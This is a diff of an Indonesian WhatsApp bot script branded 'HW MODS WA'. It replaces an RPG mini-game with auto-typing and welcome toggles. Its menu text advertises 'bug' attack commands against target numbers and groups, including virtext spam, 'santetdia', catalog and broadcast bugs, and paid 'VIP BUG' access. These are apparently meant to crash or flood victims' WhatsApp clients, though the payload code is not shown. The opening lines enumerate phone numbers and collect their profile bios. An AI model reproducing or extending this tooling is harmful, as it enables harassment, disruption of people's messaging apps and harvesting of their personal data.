+nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
+}
+} catch {
+no_watsap += `${nomer0}${i}${nomer1}\n`
+}
+}
+reply(`${nomerny}${no_bio}${no_watsap}`)
+}
+break
 //=================================================//
 case 'ping': case 'botstatus': case 'statusbot': {
 if (isBan) throw sticBanLu(from)
@@ -4669,366 +3987,110 @@ break
 case 'antilink': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
-if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
+if (args.length < 1) return anjay('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
-if (AntiLink) return m.reply('Sudah Aktif')
+if (AntiLink) return anjay('Sudah Aktif')
 ntilink.push(from)
-m.reply('Succes menyalakan antilink di group ini 🌷')
+anjay('Succes menyalakan antilink di group ini 🌷')
 } else if (args[0] === "off") {
-if (!AntiLink) return m.reply('Sudah Mati')
+if (!AntiLink) return anjay('Sudah Mati')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
-m.reply('Succes mematikan antilink di group ini 🌷')
+anjay('Succes mematikan antilink di group ini 🌷')
 } else {
-m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
+anjay('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
-break
-//=================================================//
-case 'bugghoib': {
+case 'bugghoib': case 'welcome': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
 if (args[0] === "on") {
-if (welcm) return m.reply('Sudah Aktif')
+if (welcm) return anjay('Sudah Aktif')
 wlcm.push(from)
-m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
+anjay('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
 } else if (args[0] === "off") {
-if (!welcm) return m.reply('Sudah Non Aktif')
+if (!welcm) return anjay('Sudah Non Aktif')
 let off = wlcm.indexOf(from)
 wlcm.splice(off, 1)
-m.reply('Sukses Mematikan Bug Ghoib di group ini')
+anjay('Sukses Mematikan Bug Ghoib di group ini')
 } else {
-let buttonsntnsfww = [
-{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
-{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
+const komo = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
 
 ⚠️ DANGERR ⚠️
 
- `, `HW MODS WA`, m)
+ `, 
+}
+haikal.sendMessage(m.chat, komo)
+}
+}
+break
+case 'autovn': {
+if (!isCreator && !isBan) return 
+if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
+if (args[0] === 'on') {
+if (autorecording === true) return
+global.autorecording = true
+m.reply(`Berhasil mengaktifkan autovn!`)
+} else if (args[0] === 'off') {
+if (autorecording === false) return
+global.autorecording = false
+m.reply(`Berhasil menonaktifkan autovn!`)
+} else {
+m.reply('Pilih on atau off')
 }
 }
 break
 
-//═══════════[ Rpg Menu ]═══════════\\
-
- //cr thunder
-case 'inventori': case 'inventory': case 'profile':{
-if (isBan) throw sticBanLu(from)
-if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
-if (!isInventory){ addInventori(m.sender) }
-if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
-
-let teksehmazeh = `_[ INFO USER ]_\n\n`
-teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
-teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
-teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
-teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
-teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
-teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
-teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
-teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
-teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
-teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
-teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
-teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
-teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
-reply(teksehmazeh)
+case 'autoketik': {
+if (!isCreator && !isBan) return 
+if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
+if (args[0] === 'on') {
+if (autoketik === true) return
+global.autoketik = true
+m.reply(`Berhasil mengaktifkan autoketik!`)
+} else if (args[0] === 'off') {
+if (autoketik === false) return
+global.autoketik = false
+m.reply(`Berhasil menonaktifkan autoketik!`)
+} else {
+m.reply('Pilih on atau off')
+}
 }
 break
- case 'leaderboard': { 
-if (isBan) throw sticBanLu(from)
-let txt = `「 *LEADERBOARD* 」\n\n`
-for (let i of _buruan){
-txt += `➸ *ID :* ${i.id}\n`
-txt += `*🐟 Ikan* : ${i.ikan}\n`
-txt += `*🐔 Ayam* : ${i.ayam}\n`
-txt += `*🐇 Kelinci* : ${i.kelinci}\n`
-txt += `*🐑 Domba* : ${i.domba}\n`
-txt += `*🐄 Sapi* : ${i.sapi}\n`
-txt += `*🐘 Gajah* : ${i.gajah}\n\n`
-}
- m.reply(txt)
-}
- break
-case 'mining': case 'mine':{
-if (isBan) throw sticBanLu(from)
-if (!isInventory){ addInventori(m.sender) }
-if (isCekDarah < 1) return m.reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
-let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
-let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
-let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
-var besinya = besi[Math.floor(Math.random() * besi.length)]
-var emasnya = emas[Math.floor(Math.random() * emas.length)]
-var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
-setTimeout( () => {
-let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
-let buttons = [
- {
-buttonId: `${prefix + command}`, 
-buttonText: {
-displayText: 'Menambang Lagi ⛏️'
- }, type: 1},
- ]
- let buttonMessage = {
- image: { url: './baseikal/gambarnye/tambang.jpg' },
- caption: caption,
- footer: pushname,
- buttons: buttons,
- headerType: 4
-}
-haikal.sendMessage(from, buttonMessage, { quoted: m })
 
-}, 7000)
-setTimeout( () => {
-reply(`${pushname} Mulai Menambang⛏️`)
-}, 1500)
-kurangDarah(m.sender, 10)
-addBesi(m.sender, besinya)
-addEmas(m.sended, emasnya)
-addEmerald(m.sender, emeraldnya)
+case 'autoavailable': {
+if (!isCreator && !isBan) return 
+if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
+if (args[0] === 'on') {
+if (autoavailable === true) return
+global.autoavailable = true
+m.reply(`Berhasil mengaktifkan autoavailable!`)
+} else if (args[0] === 'off') {
+if (autoavailable === false) return
+global.autoavailable = false
+m.reply(`Berhasil menonaktifkan autoavailable!`)
+} else {
+m.reply('Pilih on atau off')
+}
 }
 break
-//transaksi
- case 'beli': case 'buy':{
- if (isBan) throw sticBanLu(from)
- if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
- if (!isInventoryMonay){ addInventoriMonay(m.sender) }
- if (!isInventory){ addInventori(m.sender) }
- if (!q) return m.reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
- var anu = args[1]
-if (args[0] === 'potion'){
-let noh = 100000 * anu
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
- if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
- kurangMonay(m.sender, noh)
- var apalu = anu * 1
- addPotion(m.sender, apalu)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
-}, 2000) 
- } else 
- if (args[0] === 'baitfood'){
-let noh = 5000 * anu
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
- if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
- kurangMonay(m.sender, noh)
- var apalu = anu * 1
- addUmpan(m.sender, apalu)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
-}, 2000) 
-} else 
-if (args[0] === 'limit'){
-let noh = 35000 * anu
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
- if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
- kurangMonay(m.sender, noh)
- var apalu = anu * 1
- addLimit(m.sender, apalu)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
-}, 2000) 
-} else { m.reply("Incorrect Format!") }
- }
- break
- 
- case 'sell': case 'jual':{
- if (isBan) throw sticBanLu(from)
- if (!q) returnreply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
- if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
- if (!isInventoryMonay){ addInventoriMonay(m.sender) }
- if (!isInventory){ addInventori(m.sender) }
- var anu = args[1]
- if (args[0] === 'fish'){
- if (isIkan < anu) return m.reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
- kurangIkan(m.sender, anu)
- let monaynya = 1500 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'chicken'){
- if (isAyam < anu) return m.reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
- kurangAyam(m.sender, anu)
- let monaynya = 2500 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'rabbit'){
- if (isKelinci < anu) return m.reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
- kurangKelinci(m.sender, anu)
- let monaynya = 3000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'sheep'){
- if (isDomba < anu) return m.reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
- kurangDomba(m.sender, anu)
- let monaynya = 5000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'cow'){
- if (isSapi < anu) return m.reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
- kurangSapi(m.sender, anu)
- let monaynya = 10000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'elephant'){
- if (isGajah < anu) return m.reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
- kurangGajah(m.sender, anu)
- let monaynya = 15000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'iron'){
- if (isBesi < anu) return m.reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
- kurangBesi(m.sender, anu)
- let monaynya = 16000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'gold'){
- if (isEmas < anu) return m.reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
- kurangEmas(m.sender, anu)
- let monaynya = 50000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
-}, 2000) 
- } else
- if (args[0] === 'emerald'){
- if (isEmerald < anu) return m.reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
- if (!args[1]) return m.reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
- kurangEmerald(m.sender, anu)
- let monaynya = 100000 * anu
- addMonay(m.sender, monaynya)
-setTimeout( () => {
-reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
-}, 2000) 
- } else { m.reply("Incorrect Format!") }
- }
- break
- case 'heal':{
- if (isBan) throw sticBanLu(from)
- if (!isCekDarah < 1) return m.reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
- if (isCekDarah > 100) return m.reply('Darahmu Masih Full')
- if (isPotion < 1) return m.reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
- addDarah(m.sender, 100)
- kurangPotion(m.sender, 1)
- m.reply('Success! Darahmu Full Kembali')
- }
- break 
- case 'hunt': case 'hunting': case'berburu':{
- if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
- if (isCekDarah < 1) return m.reply('Your Blood Is Gone, Try To Heal Using Potions') 
- if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
-let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
-let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
-var ikanmu = Math.ceil(Math.random() * 10)
-var ayam = Math.ceil(Math.random() * 8)
-var kelinci = Math.ceil(Math.random() * 7)
-var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
-var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
-var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
-var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
-var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
-var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
-var lukanya = luka[Math.floor(Math.random() * luka.length)]
-var lokasinya = location[Math.floor(Math.random() * location.length)]
- if (lokasinya === 'Hutan') {
- var image = './baseikal/gambarnye/rimba.jpg'
-} else
- if (lokasinya === 'Hutan Amazon') {
- var image ='./baseikal/gambarnye/amazon.jpg'
-} else
- if (lokasinya === 'Hutan Tropis') {
- var image = './baseikal/gambarnye/tropis.jpg'
-} else
- if (lokasinya === 'Padang Rumput') {
- var image = './baseikal/gambarnye/padang_rumput.jpg'
-} else
- if (lokasinya === 'Hutan Afrika') {
- var image = './baseikal/gambarnye/afrika.jpg'
-} else
- if (lokasinya === 'Pegunungan') {
-var image = './baseikal/gambarnye/pegunungan.jpg'
-}
- setTimeout( () => {
-let teksehmazeh = `_[ Hasil Berburu ]_\n`
-teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
-teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
-teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
-teksehmazeh += `*🐑 Domba* : ${domba}\n`
-teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
-teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
-teksehmazeh += `_[ INFO ]_\n`
-teksehmazeh += `*Lokasi* : ${lokasinya}\n`
-teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
-teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
- let buttons = [
- {
-buttonId: `${prefix + command}`, 
-buttonText: {
-displayText: 'Berburu Lagi ️🏹'
- }, type: 1},
- ]
- let buttonMessage = {
- image: { url: image },
- caption: teksehmazeh,
- footer: pushname,
- buttons: buttons,
- headerType: 4
-}
-haikal.sendMessage(from, buttonMessage, { quoted: m }) 
-}, 5000)
- setTimeout( () => {
-reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
-}, 1000) 
- addIkan(m.sender, ikanmu) 
-addAyam(m.sender, ayam) 
-addKelinci(m.sender, kelinci)
-addDomba(m.sender, domba)
-addSapi(m.sender, sapi)
-addGajah(m.sender, gajah)
- kurangDarah(m.sender, 10)
- }
- break
 //=================================================//
 case 'cowner': {
 if (!isCreator) return
@@ -5086,12 +4148,17 @@ haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quote
 }
 break
 //=================================================//
-case 'creator': case 'crator': {
+
+// # BATAS # \\
+
+//=================================================//
+case 'owner': case 'crator': {
 if (isBan) throw sticBanLu(from)
 haikal.sendContact(m.chat, global.owner, m)
 }
 break
 //=================================================//
+/*
 case 'owner': {
 if (isBan) throw sticBanLu(from)
 let buttons = [
@@ -5115,7 +4182,7 @@ headerType: 4
 }
 haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
-break
+break*/
 //=================================================//
 case 'menu': {
 if (isBan) throw sticBanLu(from)
@@ -5123,7 +4190,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ Owner : ${botname}
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
 
-[ 🇲🇨 Ini adalah Bot Pribadi  Dari Indonesia 👋 ]
+[ 🇲🇨 Hello 👋 ]
+
+autoketik on / off
+autovn on / off
+autoavailable on / off
+welcome on / off
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *MENU*
 ┏━━⊱
@@ -5169,6 +4241,16 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+
+° VIP BUG ° 
+
+Akses Vip Bug 
+Hub : ${botname}
+
+🌷 [ jumlah ] #Update Baileys
+🔥 628xxx|5|5 #Update Baileys
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° SPESIAL BUG *
 
@@ -5177,25 +4259,42 @@ bugghoib [ on / off ]
 jagoanom [ reply target ]
 bugsange [ Harus Menjadi Admin ]
 bugtiktok [ Link ] - Bug Sw
+jadikatalog [ reply sticker ] jumlah
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° OTW TARGET °
 
-🔥 628xxx|5|5
 ampas1 628xxx
 santetdia 628xxx@s.whatsapp.net|10|10s
 catalogpc 628xxx@s.whatsapp.net|10|10s
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° OTW GROUP °
 
-Ketik > m.chat ( di group dulu 🌷)
+Ketik > m.chat ( di group dulu🌷)
 
 ampas2 112674448xxx
 santetgc  1237891xxxx@g.us|10|10s
 cataloggc 1237891xxxx@g.us|10|10s
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+
+° Virtext Spam °
+
+virtext1 [ jumlah ]
+virtext2 [ jumlah ]
+virtext3 [ jumlah ]
+virtext4 [ jumlah ]
+virtext5 [ jumlah ]
+virtext6 [ jumlah ]
+virtext7 [ jumlah ]
+virtext8 [ jumlah ]
+virtext9 [ jumlah ]
+virtext10 [ jumlah ]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° Bug Spam °
 
-🌷 [ jumlah ]
+sidelay [ jumlah ]
 bugstik [ jumlah ]
 bugie [ jumlah ]
 buglokas [ jumlah ]
@@ -5224,7 +4323,6 @@ bug7 [ jumlah ]
 poll [ jumlah ]
 bugtag [ jumlah ]
 inibug [ jumlah ]
-buttonampas [ jumlah ]
 hiya [ jumlah ]
 lokas [ jumlah ]
 catalog [ jumlah ]
@@ -5236,6 +4334,7 @@ troli [ jumlah ]
 troli2 [ jumlah ]
 troli3 [ jumlah ]
 spam [ Reply Pesan ]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° Jadi Bug °
 
@@ -5244,8 +4343,11 @@ jadibug2 [ Reply Video Jadi Bug Mp3 ]
 jadibug3 [ Reply Audio Jadi Bug Vn ]
 jadibug4 [ Reply Sticker Jadi Bug Gambar ]
 jadibug5 [ Reply Gambar Jadi Bug Once ] 
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ° Bug Broadcast °
+
+* Privacy *
 
 bugbcimage [ Bug image Broadcast ]
 bugbcvideo [ Bug Video Broadcas ]
@@ -5344,8 +4446,7 @@ hilih
 huluh
 heleh
 holoh
-delttt
-suitpvp [@tag]`,
+delttt]`,
 contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
@@ -5453,8 +4554,9 @@ if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
  *[ 🌷 ] Group Menu* 
 linkgroup
- ephemeral [option]
- setppgc [image]
+ ephemeral [di group]
+ setppgc /full [image]
+ setppbot / full [image]
  setname [text]
  setdesc [text]
  group [option]
@@ -5466,7 +4568,6 @@ linkgroup
  tagall [text]
  promote @user
  demote @user
- inspect
  mute on / off
  getname
  translate
@@ -5529,14 +4630,10 @@ case 'searchmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Search Menu* 
-play [query]
-yts [query]
-google [query]
 gimage [query]
 pinterest [query]
 wallpaper [query]
 wikimedia [query]
-ytsearch [query]
 ringtone [query]
 searchgroups [query]`,
 contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
@@ -5588,11 +4685,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 setcmd
 listcmd
 delcmd
-lockcmd
-addmsg
-listmsg
-getmsg
-delmsg`,
+lockcmd`,
 contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
@@ -5608,10 +4701,6 @@ if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Download Menu* 
 pinterestdl [url]
-ytmp3 [url]
-ytmp4 [url]
-getmusic [query]
-getvideo [query]
 mediafire [url]`,
 contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5634,16 +4723,15 @@ leave
 block @user
 unblock @user
 bcText [text]
-setppbot [image]
 setexif
+ban add
 ping
 owner
 creator
-menu / help /?
 delete
 infochat
 quoted
-cowner
+cowner add 628xx
 listpc
 listgc
 listonline
@@ -5880,34 +4968,6 @@ sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
 }
 }}, { quoted:m})
-}
-break
-//=================================================//
-case 'rpgmenu': {
-if (isBan) throw sticBanLu(from)
-let buttons = [
-{buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
-{buttonId: `creator`, buttonText: {displayText: 'OWNER'}, type: 1},
-{buttonId: `soundmenu`, buttonText: {displayText: 'SOUND MENU'}, type: 1}
-]
-const buttonMessage = {
-video:fs.readFileSync("./baseikal/video/haikal.mp4"),
-gifPlayback:true,
-jpegThumbnail:log0,
-caption: `
- *[ 🌷 ] Mini Games* 
-leaderboard
-inventori
-mining
-beli
-jual
-heal
-berburu`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
-}
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
 //=================================================//
